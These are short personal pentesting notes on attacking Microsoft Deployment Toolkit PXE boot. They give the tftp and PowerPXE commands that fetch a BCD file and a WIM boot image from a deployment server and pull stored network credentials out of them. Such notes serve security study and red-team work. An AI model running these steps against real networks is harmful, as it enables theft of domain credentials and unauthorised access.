(MDT) is a Microsoft service that assists with automating the deployment of Microsoft Operating Systems (OS). 

Large organisations use services such as MDT to help deploy new images in their estate more efficiently since the base images can be maintained and updated in a central location.

MDT is used for new deployments and SCCM is used for updates of apps, services and OS. 

# 🚀 - Attacking PXE Boot
---

PXE Boot allows newly connected devices to download an OS image and install it, this image has network credentials that could be retrieved.

BCD files are configuration files and "call" the real location of the OS image.

1. Locate where the BCD files are (assuming you can see internally in a network and retrieve images)
2. Obtain the BCD, you can use tftp for it:

`tftp -i [serverIP] GET "\Tmp\x64{39...28}.bcd" conf.bcd
`
Usually the files are stored in the tmp folder of the MDT server.

3. Once obtained the file, analyze it with powerpxe.ps1

Script:
https://github.com/wavestone-cdt/powerpxe/tree/master

`Import Module .\PowerPXE.ps1`
`$BCDFile = conf.bcd`
`Get-WimFile -bcdFile $BCDFile`

4. That will tell you the OS image location, once obtained get it and analyze it for credentials:

`tftp -i [serverIP] GET "<PXE Boot Image Location>" pxeboot.wim`
`Get-FindCredentials -WimFile pxeboot.wim`

This should prompt you username credentials stored in the image.


### Properties
---
📆 created   {{28-11-2023}} 19:23
🏷️ tags: #activedirectory 
---
